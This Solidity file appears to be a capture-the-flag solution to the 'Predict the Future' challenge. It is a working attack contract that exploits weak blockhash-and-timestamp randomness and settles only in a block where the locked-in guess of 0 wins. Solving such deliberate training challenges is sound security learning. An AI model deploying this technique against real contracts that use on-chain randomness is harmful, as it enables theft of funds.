// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;
pragma experimental ABIEncoderV2;

import { PredictTheFutureChallenge } from "../challenges/08_PredictTheFuture/PredictTheFutureChallenge.sol";

contract PredictTheFutureAttack {
    function lockInGuess(PredictTheFutureChallenge target) external payable {
        target.lockInGuess{ value: msg.value }(0);
    }

    function settle(PredictTheFutureChallenge target) external {
        uint8 answer = uint8(
            uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))
        ) % 10;
        require(answer == 0);
        target.settle();
    }

    receive() external payable {}
}
